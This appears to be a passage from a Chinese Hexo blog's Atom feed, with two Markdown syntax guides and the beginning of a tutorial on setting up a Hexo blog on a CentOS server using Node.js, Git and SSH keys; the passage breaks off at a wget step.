    <content type="html"><![CDATA[<h1 id="Markdown-&#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;"><a href="#Markdown-&#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;" class="headerlink" title="Markdown &#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;"></a>Markdown &#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;</h1><p><code>Markdown</code></p><hr><h3 id="1-&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;"><a href="#1-&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;" class="headerlink" title="1. &#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;"></a>1. &#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;</h3><p>&#x4F7F;&#x7528; * &#x548C; ** &#x8868;&#x793A;&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8FD9;&#x662F; <em>&#x659C;&#x4F53;</em> &#xFF0C;&#x8FD9;&#x662F; <strong>&#x7C97;&#x4F53;</strong> &#x3002;</p><h3 id="2-&#x5206;&#x7EA7;&#x6807;&#x9898;"><a href="#2-&#x5206;&#x7EA7;&#x6807;&#x9898;" class="headerlink" title="2. &#x5206;&#x7EA7;&#x6807;&#x9898;"></a>2. &#x5206;&#x7EA7;&#x6807;&#x9898;</h3><p>&#x4F7F;&#x7528; === &#x8868;&#x793A;&#x4E00;&#x7EA7;&#x6807;&#x9898;&#xFF0C; &#x4F7F;&#x7528; &#x2014; &#x8868;&#x793A;&#x4E8C;&#x7EA7;&#x6807;&#x9898;&#x3002;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><pre><code>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E00;&#x7EA7;&#x6807;&#x9898;========================&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x7EA7;&#x6807;&#x9898;-------------------------### &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E09;&#x7EA7;&#x6807;&#x9898;</code></pre><p>&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5728;&#x884C;&#x9996;&#x52A0;#&#x53F7;&#x8868;&#x793A;&#x4E0D;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x6807;&#x9898;&#xFF08;H1-H6&#xFF09;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;# H1,&#xFF0C;## H2&#xFF0C; ### H3&#xFF0C;#### H4&#x3002;</p><h3 id="3-&#x8D85;&#x94FE;&#x63A5;"><a href="#3-&#x8D85;&#x94FE;&#x63A5;" class="headerlink" title="3. &#x8D85;&#x94FE;&#x63A5;"></a>3. &#x8D85;&#x94FE;&#x63A5;</h3><p>&#x4F7F;&#x7528;[&#x63CF;&#x8FF0;](&#x94FE;&#x63A5;&#x5730;&#x5740;)&#x4E3A;&#x6587;&#x5B57;&#x589E;&#x52A0;&#x8D85;&#x94FE;&#x63A5;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8FD9;&#x662F;&#x53BB;&#x73A9;<a href="http://www.dsig.xyz/" target="_blank" rel="noopener">&#x672C;&#x4EBA;&#x535A;&#x5BA2;</a>&#x7684;&#x8FDE;&#x63A5;</p><h3 id="4-&#x65E0;&#x5E8F;&#x5217;&#x8868;"><a href="#4-&#x65E0;&#x5E8F;&#x5217;&#x8868;" class="headerlink" title="4. &#x65E0;&#x5E8F;&#x5217;&#x8868;"></a>4. &#x65E0;&#x5E8F;&#x5217;&#x8868;</h3><p>&#x4F7F;&#x7528; *&#xFF0C;+&#xFF0C;- &#x8868;&#x793A;&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x3002;</p><p>&#x793A;&#x4F8B;</p><ul><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E00;</li><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E8C;</li><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E09;</li></ul><h3 id="5-&#x6709;&#x5E8F;&#x5217;&#x8868;"><a href="#5-&#x6709;&#x5E8F;&#x5217;&#x8868;" class="headerlink" title="5. &#x6709;&#x5E8F;&#x5217;&#x8868;"></a>5. &#x6709;&#x5E8F;&#x5217;&#x8868;</h3><p>&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x548C;&#x70B9;&#x8868;&#x793A;&#x6709;&#x5E8F;&#x5217;&#x8868;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><ol><li>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E00;</li><li>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E8C;</li><li>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E09;</li></ol><h3 id="6-&#x6587;&#x5B57;&#x5F15;&#x7528;"><a href="#6-&#x6587;&#x5B57;&#x5F15;&#x7528;" class="headerlink" title="6. &#x6587;&#x5B57;&#x5F15;&#x7528;"></a>6. &#x6587;&#x5B57;&#x5F15;&#x7528;</h3><p>&#x4F7F;&#x7528; &gt; &#x8868;&#x793A;&#x6587;&#x5B57;&#x5F15;&#x7528;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><blockquote><p>&#x541B;&#x4E0D;&#x89C1;&#xFF0C;&#x9EC4;&#x6CB3;&#x4E4B;&#x6C34;&#x5929;&#x4E0A;&#x6765;&#xFF0C;&#x5954;&#x6D41;&#x5230;&#x6D77;&#x4E0D;&#x590D;&#x56DE;&#x3002;</p><p>&#x5929;&#x751F;&#x6211;&#x6750;&#x5FC5;&#x6709;&#x7528;&#xFF0C;&#x5343;&#x91D1;&#x6563;&#x5C3D;&#x8FD8;&#x590D;&#x6765;&#x3002;</p></blockquote><h3 id="7-&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;"><a href="#7-&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;" class="headerlink" title="7. &#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;"></a>7. &#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;</h3><p>&#x4F7F;&#x7528; `&#x4EE3;&#x7801;` &#x8868;&#x793A;&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8BA9;&#x6211;&#x4EEC;&#x804A;&#x804A;<code>Python</code></p><h3 id="8-&#x4EE3;&#x7801;&#x5757;"><a href="#8-&#x4EE3;&#x7801;&#x5757;" class="headerlink" title="8. &#x4EE3;&#x7801;&#x5757;"></a>8. &#x4EE3;&#x7801;&#x5757;</h3><p>&#x4F7F;&#x7528; &#x56DB;&#x4E2A;&#x7F29;&#x8FDB;&#x7A7A;&#x683C; &#xFF08;&#x6216;&#x8005;&#x4E00;&#x4E2A;<code>Tab&#x952E;</code>&#xFF09;&#x8868;&#x793A;&#x4EE3;&#x7801;&#x5757;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><pre><code class="java">public class HelloWorld{    public static void mian(String[] args){        System.out.println(&quot;Hello World!&quot;);    }}</code></pre><h3 id="9-&#x63D2;&#x5165;&#x56FE;&#x50CF;"><a href="#9-&#x63D2;&#x5165;&#x56FE;&#x50CF;" class="headerlink" title="9. &#x63D2;&#x5165;&#x56FE;&#x50CF;"></a>9. &#x63D2;&#x5165;&#x56FE;&#x50CF;</h3><p>&#x4F7F;&#x7528; ![&#x63CF;&#x8FF0;](&#x56FE;&#x7247;&#x94FE;&#x63A5;&#x5730;&#x5740;) &#x63D2;&#x5165;&#x56FE;&#x50CF;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p><img src="https://www.zybuluo.com/static/img/my_head.jpg" alt="&#x6211;&#x7684;&#x5934;&#x50CF;"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Markdown-&amp;#x7B80;&amp;#x660E;&amp;#x8BED;&amp;#x6CD5;&amp;#x624B;&amp;#x518C;&quot;&gt;&lt;a href=&quot;#Markdown-&amp;#x7B80;&amp;#x660E;&amp;#x8BED;&amp;#x6CD5;&amp;#x624B;&amp;#x518C;&quot; clas
      
    
    </summary>
    
      <category term="默认" scheme="https://marnm.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
      <category term="标记语言" scheme="https://marnm.github.io/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>Markdown语法说明（快速入门）</title>
    <link href="https://marnm.github.io//posts/5125c787/"/>
    <id>https://marnm.github.io//posts/5125c787/</id>
    <published>2018-07-05T09:15:52.000Z</published>
    <updated>2022-05-26T13:31:14.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Markdown&#x8BED;&#x6CD5;"><a href="#Markdown&#x8BED;&#x6CD5;" class="headerlink" title="Markdown&#x8BED;&#x6CD5;"></a>Markdown&#x8BED;&#x6CD5;</h2><p>&#x7B80;&#x5355;&#x8BF4;&#x4E0B;&#x4E00;&#x4E9B;Markdown&#x7684;&#x8BED;&#x6CD5;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x66F4;&#x52A0;&#x719F;&#x6089;&#x7684;&#x4F7F;&#x7528;Markdown&#x7F16;&#x5199;&#x6587;&#x7AE0;&#x4E86;&#x3002;</p><h5 id="&#x6807;&#x9898;"><a href="#&#x6807;&#x9898;" class="headerlink" title="&#x6807;&#x9898;"></a>&#x6807;&#x9898;</h5><pre><code># h1&#x7EA7;&#x6807;&#x9898;## h2&#x7EA7;&#x6807;&#x9898;### h3&#x7EA7;&#x6807;&#x9898;#### h4&#x7EA7;&#x6807;&#x9898;##### h5&#x7EA7;&#x6807;&#x9898;</code></pre><hr><h5 id="&#x5217;&#x8868;"><a href="#&#x5217;&#x8868;" class="headerlink" title="&#x5217;&#x8868;"></a>&#x5217;&#x8868;</h5><pre><code>#&#x6709;&#x5E8F;&#x5217;&#x8868;1.&#x5217;&#x8868;12.&#x5217;&#x8868;23.&#x5217;&#x8868;3</code></pre><hr><pre><code>#&#x65E0;&#x5E8F;&#x5217;&#x8868;:&#x4F7F;&#x7528; - &#x52A0;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;-&#x5217;&#x8868;&#x4E00;-&#x5217;&#x8868;&#x4E8C;-&#x5217;&#x8868;&#x4E09;</code></pre><a id="more"></a><p>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x6548;&#x679C;</p><blockquote><ol><li>&#x5217;&#x8868;1</li><li>&#x5217;&#x8868;2</li><li>&#x7C7B;&#x8868;3</li></ol></blockquote><p>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x6548;&#x679C;</p><blockquote><ul><li>&#x5217;&#x8868;&#x4E00;</li><li>&#x5217;&#x8868;&#x4E8C;</li><li>&#x5217;&#x8868;&#x4E09;</li></ul></blockquote><hr><h5 id="&#x5F3A;&#x8C03;"><a href="#&#x5F3A;&#x8C03;" class="headerlink" title="&#x5F3A;&#x8C03;"></a>&#x5F3A;&#x8C03;</h5><pre><code> *&#x659C;&#x4F53;* **&#x7C97;&#x4F53;**</code></pre><p><em>&#x659C;&#x4F53;</em><br><strong>&#x7C97;&#x4F53;</strong></p><hr><h5 id="&#x8D85;&#x94FE;&#x63A5;"><a href="#&#x8D85;&#x94FE;&#x63A5;" class="headerlink" title="&#x8D85;&#x94FE;&#x63A5;"></a>&#x8D85;&#x94FE;&#x63A5;</h5><pre><code>[&#x6211;&#x7684;&#x535A;&#x5BA2;](https://marnm.github.io/)</code></pre><p><a href="http://www.dsig.xyz/" target="_blank" rel="noopener">&#x6211;&#x7684;&#x535A;&#x5BA2;</a></p><hr><h5 id="&#x5F15;&#x7528;"><a href="#&#x5F15;&#x7528;" class="headerlink" title="&#x5F15;&#x7528;"></a>&#x5F15;&#x7528;</h5><pre><code>&gt; &#x8FD9;&#x662F;&#x5F15;&#x7528;&#x7684;&#x6587;&#x5B57;&gt; &#x5F15;&#x7528;&#x5185;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x6807;&#x9898;&#x3001;&#x6807;&#x9898;&#x5217;&#x8868;&#x7B49;&gt; ##### &#x6807;&#x9898;&gt; - &#x65E0;&#x5E8F;&#x5217;&#x8868;&gt; 1. &#x6709;&#x5E8F;&#x5217;&#x8868;</code></pre><blockquote><p>&#x8FD9;&#x662F;&#x5F15;&#x7528;&#x7684;&#x6587;&#x5B57;<br>&#x5F15;&#x7528;&#x5185;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x6807;&#x9898;&#x3001;&#x6807;&#x9898;&#x5217;&#x8868;&#x7B49;</p><h5 id="&#x6807;&#x9898;-1"><a href="#&#x6807;&#x9898;-1" class="headerlink" title="&#x6807;&#x9898;"></a>&#x6807;&#x9898;</h5><ul><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;</li></ul><ol><li>&#x6709;&#x5E8F;&#x5217;&#x8868;</li></ol></blockquote><hr><h5 id="&#x4EE3;&#x7801;"><a href="#&#x4EE3;&#x7801;" class="headerlink" title="&#x4EE3;&#x7801;"></a>&#x4EE3;&#x7801;</h5><pre><code>public class HelloWorld {    public static void main(String[] args){        System.out.println(&quot;Hello World!&quot;);    }}</code></pre><hr><h5 id="&#x8868;&#x683C;"><a href="#&#x8868;&#x683C;" class="headerlink" title="&#x8868;&#x683C;"></a>&#x8868;&#x683C;</h5><pre><code>Item     | Value-------- | ---Computer | $1600Phone    | $12Pipe     | $1</code></pre><p>&#x6548;&#x679C;</p><table><thead><tr><th>Item</th><th>Value</th></tr></thead><tbody><tr><td>Computer</td><td>$1600</td></tr><tr><td>Phone</td><td>$12</td></tr><tr><td>Pipe</td><td>$1</td></tr></tbody></table><hr><h5 id="&#x63D2;&#x5165;&#x56FE;&#x50CF;"><a href="#&#x63D2;&#x5165;&#x56FE;&#x50CF;" class="headerlink" title="&#x63D2;&#x5165;&#x56FE;&#x50CF;"></a>&#x63D2;&#x5165;&#x56FE;&#x50CF;</h5><pre><code>![&#x63CF;&#x8FF0;](URL)![@&#x56FE;&#x7247;&#x5E95;&#x4E0B;&#x663E;&#x793A;&#x63CF;&#x8FF0; | center | 300x200](1.png)</code></pre><p><img src="http://oofx6tpf6.bkt.clouddn.com/hexo-cover.png" alt="@&#x63D2;&#x5165;&#x56FE;&#x7247; | right | 300x200"></p><h5 id="&#x952E;&#x76D8;&#x952E;"><a href="#&#x952E;&#x76D8;&#x952E;" class="headerlink" title="&#x952E;&#x76D8;&#x952E;"></a>&#x952E;&#x76D8;&#x952E;</h5><pre><code>&lt;kbd&gt;Ctrl+C&lt;/kbd&gt; and &lt;kbd&gt;Ctrl+V&lt;/kbd&gt;</code></pre><p><kbd>Ctrl+C</kbd> and <kbd>Ctrl+V</kbd></p><h5 id="&#x6807;&#x8BB0;"><a href="#&#x6807;&#x8BB0;" class="headerlink" title="&#x6807;&#x8BB0;"></a>&#x6807;&#x8BB0;</h5><pre><code>`&#x6807;&#x8BB0;`</code></pre><p><code>&#x6807;&#x8BB0;</code></p><center><code>Markdown</code> <code>&#x6807;&#x8BB0;&#x8BED;&#x8A00;</code></center><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Markdown语法&quot;&gt;&lt;a href=&quot;#Markdown语法&quot; class=&quot;headerlink&quot; title=&quot;Markdown语法&quot;&gt;&lt;/a&gt;Markdown语法&lt;/h2&gt;&lt;p&gt;简单说下一些Markdown的语法使用，这样就能更加熟悉的使用Markdown编写文章了。&lt;/p&gt;
&lt;h5 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;# h1级标题
## h2级标题
### h3级标题
#### h4级标题
##### h5级标题
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h5 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;#有序列表
1.列表1
2.列表2
3.列表3
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;pre&gt;&lt;code&gt;#无序列表:使用 - 加一个空格
-列表一
-列表二
-列表三
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="默认" scheme="https://marnm.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
      <category term="标记语言" scheme="https://marnm.github.io/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>使用服务搭建Hexo个人博客</title>
    <link href="https://marnm.github.io//posts/b161a250/"/>
    <id>https://marnm.github.io//posts/b161a250/</id>
    <published>2018-07-03T15:22:24.000Z</published>
    <updated>2022-05-27T01:36:40.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;"><a href="#&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;" class="headerlink" title="&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;"></a>&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;<code>&#x8BE6;&#x7EC6;</code></h2><p>&#x5728;&#x5B66;&#x4E60;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x88AB;&#x52A8;&#x63A5;&#x53D7;&#x77E5;&#x8BC6;&#x5BF9;&#x4F60;&#x7684;&#x63D0;&#x9AD8;&#x662F;&#x8F7B;&#x5FAE;&#x7684;&#xFF1B;<br>&#x53EA;&#x6709;&#x4E3B;&#x52A8;&#x5B66;&#x4E60;&#xFF0C;&#x4E3B;&#x52A8;&#x601D;&#x8003;&#xFF0C;&#x624D;&#x80FD;&#x5B66;&#x4E60;&#x7684;&#x900F;&#x5F7B;&#xFF0C;&#x81F3;&#x5C11;&#x662F;&#x9AD8;&#x4E8E;&#x88AB;&#x52A8;&#x5B66;&#x4E60;&#x5427;&#x3002;<br>&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#xFF0C;&#x6700;&#x5927;&#x5316;&#x7684;&#x5229;&#x7528;&#x4F60;&#x6240;&#x5B66;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x68C0;&#x9A8C;&#x662F;&#x5426;&#x5B66;&#x4E60;&#x7684;&#x900F;&#x5F7B;&#x3002;</p><a id="more"></a><hr><h2 id="&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;"><a href="#&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;" class="headerlink" title="&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;"></a>&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;</h2><p>&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x662F;&#x672C;&#x5730;&#x673A;&#x5668;<code>Win 10_x64</code>&#x548C;<a href="https://cloud.tencent.com/" target="_blank" rel="noopener">&#x817E;&#x8BAF;&#x4E91;&#x670D;&#x52A1;&#x5668;</a><code>CentOS 6.5_x64</code></p><blockquote><h4 id="&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;"><a href="#&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;" class="headerlink" title="&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;"></a>&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;</h4><p>&#x5B89;&#x88C5;<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">Node.js</a>&#x548C;<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a>&#xFF0C;&#x5B89;&#x88C5;&#x65F6;&#x9ED8;&#x8BA4;&#x4E00;&#x76F4;&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x597D;&#x3002;</p></blockquote><p><img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fsz677sd2lj30m009hgll.jpg" alt="@Node.js | left |"><br><img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsz8ihdz6vj31190p8tb9.jpg" alt="@Git | left |"></p><blockquote><h5 id="&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;"><a href="#&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;" class="headerlink" title="&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;"></a>&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;</h5><p>git config &#x2013;list</p></blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsz8q34u5ej30o00eet9j.jpg" alt="@git config --list | left |"></p><blockquote><p>git config &#x2013;global user.name &#x201C;&#x7528;&#x6237;&#x540D;&#x201D;<br>git config &#x2013;global user.email &#x201C;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x201D;<br>&#x6216;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;<br>git config &#x2013;global &#x2013;replace-all user.name &#x201C;&#x7528;&#x6237;&#x540D;&#x201D;<br>git config &#x2013;global &#x2013;replace-all user.email &#x201C;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x201D;</p></blockquote><blockquote><h5 id="&#x5B89;&#x88C5;Hexo"><a href="#&#x5B89;&#x88C5;Hexo" class="headerlink" title="&#x5B89;&#x88C5;Hexo"></a>&#x5B89;&#x88C5;Hexo</h5><p>npm install -g hexo-cli</p></blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsz9zdarehj30n30d33zc.jpg" alt="@Hexo"></p><blockquote><h5 id="&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;"><a href="#&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;" class="headerlink" title="&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;"></a>&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;</h5><p>mkdir blog        // &#x521B;&#x5EFA;&#x5B58;&#x653E;Hexo&#x7AD9;&#x70B9;&#x7684;&#x6587;&#x4EF6;&#x5939;<br>hexo init blog    // &#x751F;&#x6210;Hexo&#x7AD9;&#x70B9;<br>hexo s &#x2013;debug    // &#x7AD9;&#x70B9;&#x6D4B;&#x8BD5;, &#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x6253;&#x5F00;<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a></p></blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsza7t8cgsj30u00imabv.jpg" alt="@&#x751F;&#x6210;hexo&#x7AD9;&#x70B9;"><br><img src="http://www.illgo.cn/blog/introduceHexo/debug3.png" alt="@&#x542F;&#x52A8;hexo"></p><blockquote><h5 id="&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;"><a href="#&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;" class="headerlink" title="&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;"></a>&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;</h5><p>&#x5728;&#x672C;&#x5730;&#x751F;&#x6210;&#x4E00;&#x5BF9;SSH&#x5BC6;&#x94A5;&#xFF0C;&#x7528;&#x4E8E;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;<br>ssh-keygen -t rsa -C &#x201C;<a href="mailto:echo@qq.com" target="_blank" rel="noopener">echo@qq.com</a>&#x201C;</p><blockquote><p>#&#x7B2C;&#x4E00;&#x4E2A;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;&#x3002;</p><p>#&#x7B2C;&#x4E8C;&#x4E2A;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x94A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;    </p><p>#&#x7B2C;&#x4E09;&#x4E2A;&#x786E;&#x8BA4;&#x521A;&#x8F93;&#x5165;&#x5BC6;&#x94A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;</p></blockquote></blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fszai87g5bj30kp0ch74g.jpg" alt="@&#x751F;&#x6210;&#x5BC6;&#x94A5;"></p><blockquote><h4 id="&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;"><a href="#&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;" class="headerlink" title="&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;"></a>&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;</h4><h5 id="&#x5B89;&#x88C5;Node-js"><a href="#&#x5B89;&#x88C5;Node-js" class="headerlink" title="&#x5B89;&#x88C5;Node.js"></a>&#x5B89;&#x88C5;<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">Node.js</a></h5><p>#yum install -y nodejs</p></blockquote><blockquote><h5 id="&#x5B89;&#x88C5;Git"><a href="#&#x5B89;&#x88C5;Git" class="headerlink" title="&#x5B89;&#x88C5;Git"></a>&#x5B89;&#x88C5;<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a></h5><p>&#x7531;&#x4E8E;Redhat Linux&#xFF0C;Oracle Linux&#xFF0C;CentOS&#xFF0C;Scientific Linux&#x7B49;yum&#x5E93;&#x7684;Git&#x7248;&#x672C;&#x592A;&#x4F4E;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x53BB;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;&#x7248;&#x6E90;&#x7801;&#x5305;&#x7F16;&#x8BD1;&#x5B89;&#x8F6C;&#x3002;<br>RHEL&#x548C;&#x884D;&#x751F;&#x4EA7;&#x54C1;&#x901A;&#x5E38;&#x90FD;&#x4F1A;&#x53D1;&#x5E03;&#x65E7;&#x7248;&#x672C;&#x7684;git&#x3002;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x6E90;&#x4EE3;&#x7801;&#x4E0B;&#x8F7D;<a href="https://mirrors.edge.kernel.org/pub/software/scm/git/" target="_blank" rel="noopener">tarball</a>&#x548C;&#x6784;&#x5EFA;&#xFF0C;&#x6216;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x5B58;&#x50A8;&#x5E93;&#xFF08;<a href="https://ius.io/" target="_blank" rel="noopener">&#x5982;IUS&#x793E;&#x533A;&#x9879;&#x76EE;</a>&#xFF09;&#x6765;&#x83B7;&#x53D6;&#x66F4;&#x65B0;&#x7248;&#x672C;&#x7684;git&#x3002;</p></blockquote><blockquote><p><strong>&#x9996;&#x5148;&#x5B89;&#x8F6C;Git&#x4F9D;&#x8D56;&#x5305;</strong></p><p>#yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</p><p>#yum install gcc perl-ExtUtils-MakeMaker</p><p>#yum remove git     // &#x5982;&#x679C;&#x4E4B;&#x524D;&#x6709;&#x5B89;&#x8F6C;&#x65E7;&#x7248;&#x672C;Git&#x5148;&#x5378;&#x8F7D;</p></blockquote><blockquote><p><strong>&#x4E0B;&#x8F7D;&#x89E3;&#x538B;Git&#x6E90;&#x7801;&#x5305;</strong><br>mkdir /usr/local/git<br>cd /usr/local/git<br>wget <a 